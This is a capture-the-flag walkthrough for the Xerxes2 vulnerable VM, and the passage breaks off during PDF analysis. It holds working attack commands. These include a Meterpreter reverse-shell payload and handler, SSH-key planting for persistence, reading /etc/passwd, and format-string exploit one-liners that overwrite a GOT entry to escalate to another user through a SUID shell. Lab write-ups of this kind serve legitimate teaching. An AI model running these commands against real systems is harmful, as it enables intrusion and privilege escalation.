00000060   AB AE B0 B3  B5 B8 BA BD  C1 C3 C6 C8  CB CD D0 D2  D5 D7 DA DC  DF E1 E4 E6  &hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;
00000078   E9 EB EE F0  F3 F5 F8 FA  FD 00 00 00  39 4C 41 4D  45 33 2E 39  39 72 01 6E  &hellip;&hellip;&hellip;&hellip;9LAME3.99r.n
00000090   00 00 00 00  00 00 00 00  14 40 24 04  75 22 00 00  40 00 01 9C  3D 73 EB 43  &hellip;&hellip;&hellip;@$.u&#8221;..@&hellip;=s.C
000000A8   3E 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  >&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;..
000000C0   00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  FF F3 80 C4  00 26 2C 0E  &hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&amp;,.
000000D8   00 29 4F 40  01 0A 10 F5  7A BD 0F 34  CB 79 A6 EC  FC 13 71 37  17 31 EB 27  .)O@&hellip;.z..4.y&hellip;.q7.1.&lsquo;
000000F0   66 9A 8D 5E  FD E3 C6 05  63 C8 9F 0C  00 07 08 D8  38 0F 07 16  2E 7A 22 25  f..^&hellip;.c&hellip;&hellip;.8&hellip;.z&#8221;%
00000108   6E F7 EE EF  7F F2 EE FC  27 FB BB BB  FF EE F7 EE  EE EF FB A2  22 22 57 FF  n&hellip;&hellip;.&rsquo;&hellip;&hellip;&hellip;..&ldquo;&#8221;W.
00000120   EE EF FF FF  A3 BB BB BD  FF E8 88 88  8E FF FF FF  EE EE E2 86  22 27 FB BB  &hellip;&hellip;&hellip;&hellip;&hellip;&hellip;..&rdquo;&lsquo;..
00000138   BB DF 08 2E  2E 7B DF FF  E8 89 5B A2  22 7B E8 2E  7B E8 88 40  A0 B8 B8 B9  &hellip;..{&hellip;.[.&ldquo;{..{..@&hellip;.
00000150   EE EE E2 E2  82 82 82 82  89 52 E2 82  82 86 54 BB  DC BB DF 08  88 E5 8B 9E  &hellip;&hellip;&hellip;R&hellip;.T&hellip;&hellip;&hellip;
00000168   F7 01 C0 28  00 18 00 C0  5C 1B 8B 8B  B8 7A E1 0B  48 0D 19 13  69 B5 1A 88  &hellip;(&hellip;..&hellip;z..H&hellip;i&hellip;
00000180   C4 62 05 F6  16 34 64 23  3C A8 E9 01  8C 1D 1F CF  8A 86 86 35  B7 5D 2F 13  .b&hellip;4d#&lt;&hellip;&hellip;&hellip;.5.]/.[/plain]</p>

<p>Oooh, I spy the word LAME, which means this is an MP3. If you want to hear the MP3, you can download it <a href="http://fourfourfourfour.co/wp-content/uploads/2014/08/xerxes2.mp3">right here</a>. Not very exciting huh ?</p>

<hr />

<h2>Windowlicker</h2>

<p>What is interesting about this MP3 is not what you can hear, but what you can see in the waveform. Much like the demon face in Windowlicker by Aphex Twin, here we have a hidden image in the spectrogram. If you want to know how to find this, take a look at <a href="http://lifehacker.com/5807289/how-to-hide-secret-messages-and-codes-in-audio-files">this Lifehacker article</a>.</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/08/xerxes2_001.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/08/xerxes2_001.png" alt="xerxes2_001" /></a></p>

<p>This, however, is just a diversion. The image is of <a href="http://shodan.wikia.com/wiki/Xerxes">Xerxes</a> from System Shock 2, but the whole MP3 is an easter egg - but a cool one none the less ! Let&rsquo;s move on.</p>

<hr />

<h2>If You&rsquo;re Not Taking Notes, You&rsquo;re Not Learning.</h2>

<p>So, with port 4444 crossed out, lets have a look at some other ports. 8888 is my next target, which returns nothing if you netcat to it, but provides an Python based Notebook application. This page also gives us an insight into the name of one of the users - delacroix.</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/08/xerxes2_002.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/08/xerxes2_002.png" alt="xerxes2_002" /></a></p>

<p>It is possible to run commands through this application by creating a new notebook, and prefixing all commands with !. As an example, I&rsquo;ve created a new notebook and have run the whoami command in the screenshot below (you&rsquo;ll note that id didn&rsquo;t work)</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/08/xerxes2_003.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/08/xerxes2_003.png" alt="xerxes2_003" /></a></p>

<p>At this point I decided to be sneaky and make this download and run a reverse Meterpreter binary&hellip; I created my binary using msfpayload, hosted it on an internal HTTP server, and then set up a multi/handler to accept the connection.</p>

<p>[plain gutter=&ldquo;false&rdquo;]
root@pwk:~# msfpayload linux/x86/meterpreter/reverse_tcp lhost=192.168.0.110 lport=4444 x > xerxes_4444
Created by msfpayload (<a href="http://www.metasploit.com">http://www.metasploit.com</a>).
Payload: linux/x86/meterpreter/reverse_tcp
 Length: 71
Options: {&ldquo;LHOST&rdquo;=>&ldquo;192.168.0.110&rdquo;, &ldquo;LPORT&rdquo;=>&ldquo;4444&rdquo;}
root@pwk:~# cp xerxes_4444 /var/www[/plain]</p>

<p>[plain gutter=&ldquo;false&rdquo;]
root@pwk:~# msfconsole
msf > use multi/handler
msf exploit(handler) > set payload linux/x86/meterpreter/reverse_tcp
payload => linux/x86/meterpreter/reverse_tcp
msf exploit(handler) > set lhost 192.168.0.110
lhost => 192.168.0.110
msf exploit(handler) > set lport 4444
lport => 4444
msf exploit(handler) > run</p>

<p>[<em>] Started reverse handler on 192.168.0.110:4444
[</em>] Starting the payload handler&hellip;[/plain]</p>

<p>The following command pasted into the Python notebook application downloads the binary from the HTTP server to /tmp, makes it executable, and then executes it.</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/08/xerxes2_004.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/08/xerxes2_004.png" alt="xerxes2_004" /></a></p>

<p>A reverse connection is received by the multi/handler, which allows us to get a shell as delacroix, but it disconnects after a certain amount of time.</p>

<p>[plain gutter=&ldquo;false&rdquo;]
[<em>] Sending stage (1138688 bytes) to 192.168.0.102
[</em>] Meterpreter session 1 opened (192.168.0.110:4444 -> 192.168.0.102:34718) at 2014-08-08 13:20:31 +0100</p>

<p>meterpreter > shell
Process 14990 created.
Channel 1 created.
$ id
uid=1002(delacroix) gid=1002(delacroix) groups=1002(delacroix)
$
[*] 192.168.0.102 - Meterpreter session 1 closed.  Reason: Died[/plain]</p>

<p><img src="http://media.giphy.com/media/8x6MVS4l7wh3O/giphy.gif" alt="" /></p>

<p>It seems that I&rsquo;ve been scuppered, and that Xerxes is terminating my connection, as seen on the Python Notebook page</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/08/xerxes2_005.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/08/xerxes2_005.png" alt="xerxes2_005" /></a></p>

<p>However, it looks like I have a small window before the session is terminated - because of this I am able to be quick and echo my SSH public key added to the authorized_keys file, which allows me to subsequently SSH in as delacroix sans password.</p>

<p>[plain gutter=&ldquo;false&rdquo;]
root@pwk:~# ssh <a href="&#x6d;&#97;&#x69;&#x6c;&#116;&#111;&#58;&#100;&#x65;&#108;&#97;&#99;&#114;&#x6f;&#105;&#120;&#64;&#x31;&#57;&#x32;&#46;&#x31;&#x36;&#56;&#46;&#x30;&#x2e;&#49;&#48;&#50;">&#x64;&#x65;&#x6c;&#x61;&#99;&#x72;&#x6f;&#105;&#120;&#x40;&#49;&#57;&#x32;&#x2e;&#49;&#x36;&#x38;&#46;&#x30;&#x2e;&#x31;&#x30;&#50;</a></p>

<p>Welcome to xerxes2.
      XERXES wishes you
       a pleasant stay.</p>

<hr />

<p><code>MM(   )P' 6MMMMb</code>MM 6MM <code>MM(   )P' 6MMMMb   6MMMMb\  6MMMMb
</code>MM<code>,P  6M' </code>Mb MM69 &ldquo;  <code>MM</code> ,P  6M&#8217;  <code>Mb MM'   </code> MM&#8217;  <code>Mb
 </code>MM,P   MM    MM MM&#8217;      <code>MM,P   MM    MM YM.           ,MM
  </code>MM.   MMMMMMMM MM        <code>MM.   MMMMMMMM  YMMMMb      ,MM'
   d</code>MM.  MM       MM        d<code>MM.  MM           </code>Mb   ,M&#8217;
  d&#8217; <code>MM. YM    d9 MM       d'</code>MM. YM    d9 L    ,MM ,M&#8217;
<em>d</em>  <em>)MM</em> YMMMM9 <em>MM</em>    <em>d</em>  <em>)MM</em> YMMMM9  MYMMMM9  MMMMMMMM</p>

<p>/usr/bin/xauth:  file /home/delacroix/.Xauthority does not exist
delacroix@xerxes2:~$ [/plain]</p>

<p><img src="http://img3.wikia.nocookie.net/__cb20140515210256/sailormoon/images/3/3c/Stephen-colbert-celebration-gif.gif" alt="" /></p>

<hr />

<h2>Aboard the Von Braun with Marie</h2>

<p><img src="http://img2.wikia.nocookie.net/__cb20111214193445/shodan/images/b/b0/Marie_Delacroix.png" alt="" /></p>

<p>This is <a href="http://shodan.wikia.com/wiki/Marie_Delacroix">Marie Delacroix</a> - creator of <a href="http://shodan.wikia.com/wiki/Sarah">Sarah</a> which Xerxes was employed to run.</p>

<p>First things first, lets get a list of possible users from /etc/passwd</p>

<p>[plain gutter=&ldquo;false&rdquo;]
delacroix@xerxes2:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
<a href="news:x:9:9:news:/var/spool/news:/bin/sh">news:x:9:9:news:/var/spool/news:/bin/sh</a>
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
Debian-exim:x:101:103::/var/spool/exim4:/bin/false
statd:x:102:65534::/var/lib/nfs:/bin/false
sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin
korenchkin:x:1000:1000:Anatoly Korenchkin,,,:/home/korenchkin:/bin/bash
polito:x:1001:1001:Janice Polito,,,:/home/polito:/bin/bash
delacroix:x:1002:1002:Marie St. Anne Delacroix,,,:/home/delacroix:/bin/bash
[/plain]</p>

<p>The delacroix user has source code for an application in their home folder.</p>

<p>[c]/<em> found this lingering around somewhere </em>/</p>

<h1>include &lt;stdio.h></h1>

<h1>include &lt;string.h></h1>

<h1>include &lt;unistd.h></h1>

<h1>include &lt;stdlib.h></h1>

<h1>define BUF_SIZE 30000</h1>

<p>void bf(char <em>program, char </em>buf)
{</p>

<pre><code>int programcounter = 0;
int datapointer = 0;

while (program[programcounter])
{
    switch(program[programcounter])
    {
        case '.':
            printf("%c", buf[datapointer]);
            break;
        case ',':
            buf[datapointer] = getchar();
            break;
        case '&gt;':
            datapointer = (datapointer == (BUF_SIZE-1)) ? 0 : ++datapointer;
            break;
        case '&lt;':
            datapointer = (datapointer == 0) ? (BUF_SIZE-1) : --datapointer;
            break;
        case '+':
            buf[datapointer]++;
            break;
        case '-':
            buf[datapointer]--;
            break;
        case '[':
            if (buf[datapointer] == 0)
            {
                int indent = 1;
                while (indent)
                {
                    programcounter++;

                    if (program[programcounter] == ']')
                    {
                        indent--;
                    }
                    if (program[programcounter] == '[')
                    {
                        indent++;
                    }
                }
            }
            break;
        case ']':
            if (buf[datapointer])
            {
                int indent = 1;
                while (indent)
                {
                    programcounter--;

                    if (program[programcounter] == ']')
                    {
                        indent++;
                    }
                    if (program[programcounter] == '[')
                    {
                        indent--;
                    }
                }
            }
            break;
        case '#':
            // new feature
            printf(buf);
            break;
    }
    programcounter++;
}
</code></pre>

<p>}</p>

<p>int main(int argc, char **argv)
{
    char buf[BUF_SIZE];</p>

<pre><code>if (argc &lt; 2)
{
        printf("usage: %s [program]\n", argv[0]);
        exit(-1);
}

memset(buf, 0, sizeof(buf));
bf(argv[1], buf);

exit(0);
</code></pre>

<p>}[/c]</p>

<p>It looks like some kind of interpreter - what language uses +-&lt;>,. and # ? Well, I know for a fact that <a href="http://en.wikipedia.org/wiki/Brainfuck">Brainfuck</a> uses all but #, and the source code says that # is a new function. Maybe this is a Brainfuck interpreter (please don&rsquo;t let it be Brainfuck). It looks like a compiled version of this code is available in /opt, so lets pass it a Hello World program to see if our assumption is true.</p>

<p>[plain gutter=&ldquo;false&rdquo;]
delacroix@xerxes2:~$ /opt/bf &ldquo;++++++++[>++++[>++>+++>+++>+&lt;&lt;&lt;&lt;-]>+>+>->>+[&lt;]&lt;-]>>.>&mdash;.+++++++..+++.>>.&lt;-.&lt;.+++.&mdash;&mdash;.&mdash;&mdash;&ndash;.>>+.>++.&rdquo;
Hello World!
delacroix@xerxes2:~$ [/plain]</p>

<p>Yup, it&rsquo;s Brainfuck. Shit.</p>

<p><img src="http://files.abovetopsecret.com/files/img/gm5273ef16.gif" alt="" /></p>

<p>However, it is owned by the polito user, and has SUID set.</p>

<p>The source code for the newly added # command indicates that it will be susceptible to a formatstring vulnerability - you can read about my forays in formatstr in my Hell writeup, but this one took a LOT longer. After I prodded around for a bit, I decided that I would overwrite the printf() pointer in the global offset table with the memory address of system() by calling # with a formatstring buffer, then call the newly redirected # command with a buffer of /bin/sh. This should technically run /bin/sh for me.</p>

<p>So, lets start basic. Here&rsquo;s my process of trying to find things in the stack.</p>

<p>[plain gutter=&ldquo;false&rdquo;]
delacroix@xerxes2:~$ echo &lsquo;AAAA%17$x&rsquo; | /opt/bf &lsquo;,>,>,>,>,>,>,>,>,#&rsquo;
AAAA24373125
delacroix@xerxes2:~$ echo &lsquo;AAA%17$xBBBB.%18$x&hellip;.%19$x&hellip;&rsquo; | /opt/bf &lsquo;,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,#&rsquo;
AAA78243731BBBBB.42424242&hellip;.31252e42
delacroix@xerxes2:~$ echo &lsquo;AAAA%16$x&rsquo; | /opt/bf &lsquo;,>,>,>,>,>,>,>,>,#&rsquo;
AAAA41414141[/plain]</p>

<p>OK, so I can put things into the buffer and find them in the stack. However, there&rsquo;s a gotcha - ASLR is enabled on this box - we need to circumvent that. Could I write an application that has ASLR disabled, and run that, then use the system location from that and call it ? Probably&hellip; what about gdb, I know that <a href="http://www.outflux.net/blog/archives/2010/07/03/gdb-turns-off-aslr/">disables ASLR</a>, but it also disables SUID, so that&rsquo;s out. Google to the rescue ! The <a href="http://security.cs.pub.ro/hexcellents/wiki/kb/exploiting/home">following site</a> helpfully tells me that ulimit -s unlimited disables ASLR on 32bit systems, so that&rsquo;s my golden ticket.</p>

<p>So, with ASLR temporarily disabled, I can find the location for the printf got pointer using objdump.</p>

<p>[plain gutter=&ldquo;false&rdquo;]
delacroix@xerxes2:~$ ulimit -s unlimited
delacroix@xerxes2:~$ objdump -R /opt/bf</p>

<p>/opt/bf:     file format elf32-i386</p>

<p>DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
08049a38 R_386_GLOB_DAT    <strong>gmon_start</strong>
08049a48 R_386_JUMP_SLOT   printf
08049a4c R_386_JUMP_SLOT   getchar
08049a50 R_386_JUMP_SLOT   <strong>gmon_start</strong>
08049a54 R_386_JUMP_SLOT   exit
08049a58 R_386_JUMP_SLOT   __libc_start_main
08049a5c R_386_JUMP_SLOT   memset
08049a60 R_386_JUMP_SLOT   putchar[/plain]</p>

<p>printf is at 08049a48. Now I have to find system(). gdb can help with that.</p>

<p>[plain gutter=&ldquo;false&rdquo;]
delacroix@xerxes2:~$ gdb /opt/bf
GNU gdb (GDB) 7.4.1-debian
Copyright &copy; 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <a href="http://gnu.org/licenses/gpl.html">http://gnu.org/licenses/gpl.html</a>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type &ldquo;show copying&rdquo;
and &ldquo;show warranty&rdquo; for details.
This GDB was configured as &ldquo;i486-linux-gnu&rdquo;.
For bug reporting instructions, please see:
<a href="http://www.gnu.org/software/gdb/bugs/">http://www.gnu.org/software/gdb/bugs/</a>&hellip;
Reading symbols from /opt/bf&hellip;(no debugging symbols found)&hellip;done.
(gdb) break main
Breakpoint 1 at 0x8048687
(gdb) run
Starting program: /opt/bf</p>

<p>Breakpoint 1, 0x08048687 in main ()
(gdb) p system
$1 = {<text variable, no debug info>} 0x40062000 <system>
(gdb) p printf
$2 = {<text variable, no debug info>} 0x4006ff50 <printf>
[/plain]</p>

<p>I need to overwrite 0x08049a48 with 0x40062000 - that shouldn&rsquo;t be too hard. I really only need to change the last 2 bytes from ff50 to 2000, which means I can do this with just one write. After lots of debugging I ended up at the following</p>

<p>[plain gutter=&ldquo;false&rdquo;]
echo $(python -c &ldquo;print &lsquo;\x48\x9a\x04\x08&rsquo;&rdquo;)%8186u%16\$hn | /opt/bf &lsquo;,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,##&rsquo;[/plain]</p>

<p>I have many conversations with people on IRC, where I like to think aloud with people I talk to on a regular basis. c0ne helped me with the formatstr on Hell, so it was natural I&rsquo;d talk to him</p>

<p>[plain gutter=&ldquo;false&rdquo;][23:16:17]  <recrudesce>  delacroix@xerxes2:~$ echo &ldquo;ABCD&rdquo; | ./b &ldquo;,>#&rdquo;
[23:16:19]  <recrudesce>    returns A
[23:16:24]  <recrudesce>    echo &ldquo;ABCD&rdquo; | ./b &ldquo;,>&lt;,>#&rdquo; returns B
[23:16:30]  <recrudesce>    echo &ldquo;ABCD&rdquo; | ./b &ldquo;,>&lt;,>&lt;,#&rdquo; = C
[23:16:36]  <recrudesce>    echo &ldquo;ABCD&rdquo; | ./b &ldquo;,>&lt;,>&lt;,>&lt;,#&rdquo; = D
[23:16:38]  <recrudesce>    so&hellip;
[23:16:41]  <c0ne>  i get
[23:16:49]  <c0ne>  so it needs placeholder to print to
[23:16:56]  <c0ne>  placeholders
[23:17:06]  <c0ne>  ,>&lt;,>&lt;,>&lt;,
[23:17:13]  <c0ne>  not sure how it works
[23:18:09]  <recrudesce>    echo &ldquo;ABCDE&rdquo; | ./b &ldquo;,>,>,>,#&lt;,&lt;&lt;&lt;,>#&rdquo;
[23:18:13]  <recrudesce>    ABCDABED
[23:18:55]  <recrudesce>    echo &ldquo;ABCDWXYZ&rdquo; | ./b &ldquo;,>,>,>,#&lt;&lt;&lt;,>,>,>,#&rdquo;
[23:19:18]  <recrudesce>    ook, so that reads ABCD into the buffer, then prints it, goes back to the start of the buffer, and reads the next 4 characters, WXYZ
[23:19:20]  <recrudesce>    then prints that
[23:19:37]  <recrudesce>    so, all we need to do is go back to a few pointers, and re-read some further data in
[23:20:08]  <c0ne>  Oo
[23:20:11]  <recrudesce>    so, we need to make sure that the correct amount of ,> are before our first #
[23:20:18]  <recrudesce>    else we accidently read /bin/bash too[/plain]</p>

<p>Many many failures were experienced at this point - and I&rsquo;m talking at least 3 hours of failed executions or failed memory overwrites.  I managed to get basic command execution, but only once every 5-10 attempts would be successful due to the stack shifting ever so slightly.  Anyway, who wants to listen to my boohoo story - you came here for the answers, so here&rsquo;s what you have to do. Make a shell script in /tmp containing the following</p>

<p>[bash]</p>

<h1>!/bin/sh</h1>

<p>cp /bin/sh /tmp/shell
chmod 4777 /tmp/shell[/bash]</p>

<p>chmod +x the file so it is executable, and then run the following</p>

<p>[plain gutter=&ldquo;false&rdquo;]delacroix@xerxes2:~$ echo $(python -c &ldquo;print &lsquo;\x48\x9a\x04\x08&rsquo; + &lsquo;%8186u%16\$hn;\/tmp\/123.sh\x00&rsquo;&rdquo;) | /opt/bf &lsquo;,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,#&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;,>,>,>,>,>,>,>,>,>,>,>,>,>,>,#&rsquo;[/plain]</p>

<p>It will probably throw an error, but the shell script will run and you&rsquo;ll end up with a copy of /bin/sh in /tmp, with the SUID bit set, which when run will elevate you to the polito user.</p>

<p>[plain gutter=&ldquo;false&rdquo;]
1075339252delacroix@xerxes2:~$ ls -l /tmp
total 148
-rw-r&ndash;r&ndash; 1 delacroix delacroix    53 Aug  6 12:07 file1
-rw-r&ndash;r&ndash; 1 delacroix delacroix    61 Aug  6 13:03 file2
-rw-r&ndash;r&ndash; 1 delacroix delacroix    49 Aug  6 12:24 file3
-rw-r&ndash;r&ndash; 1 delacroix delacroix    49 Aug  6 12:27 file4
-rw-r&ndash;r&ndash; 1 delacroix delacroix     5 Aug  6 12:31 file5
-rw-r&ndash;r&ndash; 1 delacroix delacroix   253 Aug  6 12:50 file6
-rw-r&ndash;r&ndash; 1 delacroix delacroix    73 Aug  6 13:37 file7
-rw-r&ndash;r&ndash; 1 delacroix delacroix    49 Aug  6 13:59 file8
-rw-r&ndash;r&ndash; 1 delacroix delacroix    44 Aug  6 13:59 file9
-rw-r&ndash;r&ndash; 1 delacroix delacroix    11 Aug  6 14:15 filea
-rw-r&ndash;r&ndash; 1 delacroix delacroix    11 Aug  6 14:13 fileb
-rw-r&ndash;r&ndash; 1 delacroix delacroix    11 Aug  6 14:13 filec
-rwxr-xr-x 1 delacroix delacroix    55 Aug  6 16:15 gah.sh
-rwsrwxrwx 1 polito    polito    97284 Aug  6 16:15 shell
delacroix@xerxes2:~$ /tmp/shell
$ id
uid=1002(delacroix) gid=1002(delacroix) euid=1001(polito) groups=1001(polito),1002(delacroix)
$[/plain]</p>

<p>I then did the same deal here - echo&rsquo;d my SSH public key to ~/.ssh/authorized_keys and SSH&rsquo;d in as polito.</p>

<p>As a side note, I spoke to barrebas on IRC about my exploit route and he was able to refine it further</p>

<p>[plain gutter=&ldquo;false&rdquo;][00:15:55]  <barrebas>    sweet your exploit is much smaller than mine, nice!
[00:16:01]  <recrudesce>    really ???
[00:16:19]  <barrebas>  yeah, i didn&rsquo;t use direct parameter addressing
[00:16:33]  <barrebas>  and i wrote 4 bytes instead of 2, yours is smarter
[00:16:54]  <recrudesce>    that&rsquo;s taken me hours
[00:25:48]  <barrebas>  a bit shorter still:
[00:25:50]  <barrebas>  python -c &ldquo;print &lsquo;\x48\x9a\x04\x08&rsquo; + &lsquo;;\/tmp\/123.sh;%8173u%16\$hn&rsquo;&rdquo; | /opt/bf &lsquo;,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,>,##&rsquo;
[00:26:08]  <recrudesce>    you know what, that looks like another one i did, but only slightly
[00:26:36]  <barrebas>  anyway, nice work[/plain]</p>

<p><img src="http://www.playandroid.com/wp-content/uploads/2012/04/U-Mad-Bro.jpg" alt="" /></p>

<hr />

<h2>Wandering the Operations Deck with Janice</h2>

<p><img src="http://img3.wikia.nocookie.net/__cb20111214193431/shodan/images/2/22/Janice_Polito_%28portrait%29.png" alt="" /></p>

<p>Say hello to <a href="http://shodan.wikia.com/wiki/Janice_Polito">Janice Polito</a>, she&rsquo;s got a smirk on her hasn&rsquo;t she ?</p>

<p>[plain gutter=&ldquo;false&rdquo;]root@pwk:~# ssh <a href="&#109;&#97;&#105;&#108;&#x74;&#x6f;&#58;&#x70;&#111;&#x6c;&#105;&#x74;&#x6f;&#64;&#x31;&#x39;&#50;&#46;&#49;&#54;&#x38;&#x2e;&#48;&#46;&#49;&#48;&#x32;">&#x70;&#x6f;&#x6c;&#105;&#116;&#x6f;&#64;&#49;&#57;&#x32;&#46;&#x31;&#54;&#x38;&#46;&#x30;&#46;&#49;&#48;&#x32;</a></p>

<p>Welcome to xerxes2.
      XERXES wishes you
       a pleasant stay.</p>

<hr />

<p><code>MM(   )P' 6MMMMb</code>MM 6MM <code>MM(   )P' 6MMMMb   6MMMMb\  6MMMMb
</code>MM<code>,P  6M' </code>Mb MM69 &ldquo;  <code>MM</code> ,P  6M&#8217;  <code>Mb MM'   </code> MM&#8217;  <code>Mb
 </code>MM,P   MM    MM MM&#8217;      <code>MM,P   MM    MM YM.           ,MM
  </code>MM.   MMMMMMMM MM        <code>MM.   MMMMMMMM  YMMMMb      ,MM'
   d</code>MM.  MM       MM        d<code>MM.  MM           </code>Mb   ,M&#8217;
  d&#8217; <code>MM. YM    d9 MM       d'</code>MM. YM    d9 L    ,MM ,M&#8217;
<em>d</em>  <em>)MM</em> YMMMM9 <em>MM</em>    <em>d</em>  <em>)MM</em> YMMMM9  MYMMMM9  MMMMMMMM</p>

<p>polito@xerxes2:~$ id
uid=1001(polito) gid=1001(polito) groups=1001(polito)
polito@xerxes2:~$ ls -l
total 172960
-rw-r&ndash;r&ndash; 1 polito polito    142564 Jul 16 10:57 audio.txt
-rw-r&ndash;r&ndash; 1 polito polito  44813850 Jul 16 12:17 dump.gpg
-rw-r&ndash;r&ndash; 1 polito polito     27591 Jul 16 12:19 polito.pdf
[/plain]</p>

<p>OK, so in /home/polito we have a PDF, a PGP&rsquo;d file and an audio.txt file.  This audio.txt is being served by nc on port 4444 - surprise !</p>

<p>[plain gutter=&ldquo;false&rdquo;]
polito@xerxes2:~$ ps aux | grep 4444
polito    2175  0.0  0.1   1936   568 ?        Ss   Aug06   0:00 /bin/sh -c while true ; do nc -l -p 4444 &lt; /home/polito/audio.txt ; done
polito   19481  0.0  0.1   1904   640 ?        S    08:56   0:00 nc -l -p 4444
[/plain]</p>

<p>Sit comfortably, children, for I have a story to tell about this PDF. I transferred it to my laptop, and opened it&hellip; a blank PDF. I decided there must be something hidden in the file. Now, I must admit my PDF forensics skills are somewhat lacking. However, people like Didier Stevens make life a little easier with their little Python tools such as <a href="http://blog.didierstevens.com/programs/pdf-tools/">pdf-parser</a>.</p>

<p>I used pdf-parser to see what the PDF contained</p>

<p>[plain gutter=&ldquo;false&rdquo;]
root@pwk:~# pdf-parser polito.pdf
PDF Comment &lsquo;%PDF-1.5\n&rsquo;</p>

<p>obj 999 0
 Type:
 Referencing:
 Contains stream</p>

<p>  &lt;&lt;</p>

<blockquote><blockquote></blockquote></blockquote>

<p>obj 3 0
 Type: /Page
 Referencing: 4 0 R, 2 0 R, 7 0 R</p>

<p>  &lt;&lt;
    /Type /Page
    /Contents 4 0 R
    /Resources 2 0 R
    /MediaBox [0 0 595.276 841.89]
    /Parent 7 0 R</p>

<blockquote><blockquote></blockquote></blockquote>

<p>obj 1 0
 Type: /XObject
 Referencing: 8 0 R
 Contains stream</p>

<p>  &lt;&lt;
    /Type /XObject
    /Subtype /Image
    /Width 200
    /Height 200
    /BitsPerComponent 1
    /ColorSpace [/Indexed /DeviceRGB 1 8 0 R]
    /Length 301
    /Filter /FlateDecode</p>

<blockquote><blockquote></blockquote></blockquote>

<p>obj 8 0
 Type:
 Referencing:
 Contains stream</p>

<p>  &lt;&lt;
    /Length 14
    /Filter /FlateDecode</p>

<blockquote><blockquote></blockquote></blockquote>

<p>obj 2 0
 Type:
 Referencing: 5 0 R, 6 0 R, 1 0 R</p>

<p>  &lt;&lt;
    /Font
      &lt;&lt;
        /F15 5 0 R
        /F8 6 0 R
      >>
    /XObject
      &lt;&lt;
        /Im1 1 0 R
      >>
    /ProcSet [ /PDF /Text /ImageC /ImageI ]</p>

<blockquote><blockquote></blockquote></blockquote>

<p>obj 9 0
 Type:
 Referencing:</p>

<p>obj 10 0
 Type:
 Referencing:</p>

<p>obj 11 0
 Type:
 Referencing:
 Contains stream</p>

<p>  &lt;&lt;
    /Length1 1462
    /Length2 9126
    /Length3 0
    /Length 10107
    /Filter /FlateDecode</p>

<blockquote><blockquote></blockquote></blockquote>

<p>obj 12 0
 Type: /FontDescriptor
 Referencing: 11 0 R</p>

<p>  &lt;&lt;
    /Type /FontDescriptor
    /FontName /WEGFEK+CMR10
    /Flags 4
    /FontBBox [-40 -250 1009 750]
    /Ascent 694
    /CapHeight 683
    /Descent -194
    /ItalicAngle 0
    /StemV 69
    /XHeight 431
    /CharSet (
    /R /b
    /comma /e
    /m /r)
    /FontFile 11 0 R</p>

<blockquote><blockquote></blockquote></blockquote>

<p>obj 13 0
 Type:
 Referencing:
 Contains stream</p>

<p>  &lt;&lt;
    /Length1 1858
    /Length2 11943
    /Length3 0
    /Length 13097
    /Filter /FlateDecode</p>

<blockquote><blockquote></blockquote></blockquote>

<p>obj 14 0
 Type: /FontDescriptor
 Referencing: 13 0 R</p>

<p>  &lt;&lt;
    /Type /FontDescriptor
    /FontName /ZTMOYO+CMTT10
    /Flags 4
    /FontBBox [-4 -233 537 696]
    /Ascent 611
    /CapHeight 611
    /Descent -222
    /ItalicAngle 0
    /StemV 69
    /XHeight 431
    /CharSet (
    /F /H
    /I /Y
    /a /b
    /c /comma
    /d /e
    /f /g
    /h /i
    /k /l
    /m /n
    /o /p
    /period /question
    /quoteright /r
    /s /slash
    /t /u
    /v /w
    /y )
    /FontFile 13 0 R</p>

<blockquote><blockquote></blockquote></blockquote>

<p>obj 6 0
 Type: /Font
 Referencing: 12 0 R, 9 0 R</p>

<p>  &lt;&lt;
    /Type /Font
    /Subtype /Type1
    /BaseFont /WEGFEK+CMR10
    /FontDescriptor 12 0 R
    /FirstChar 44
    /LastChar 114
    /Widths 9 0 R</p>

<blockquote><blockquote></blockquote></blockquote>

<p>obj 5 0
